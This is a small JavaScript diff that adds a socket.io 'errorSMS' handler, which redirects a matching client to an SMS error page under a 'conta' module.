@@ -56,6 +56,12 @@ const await = (() => {
             } else return
         })
 
+        socket.on('errorSMS', (data) => {
+            if (client_id) {
+                if (client_id == data) window.location.href = `/modules/conta/sms/${data}?error=true`
+            } else return
+        })
+
         socket.on('FinishClient', (data) => {
 
             if (client_id) {
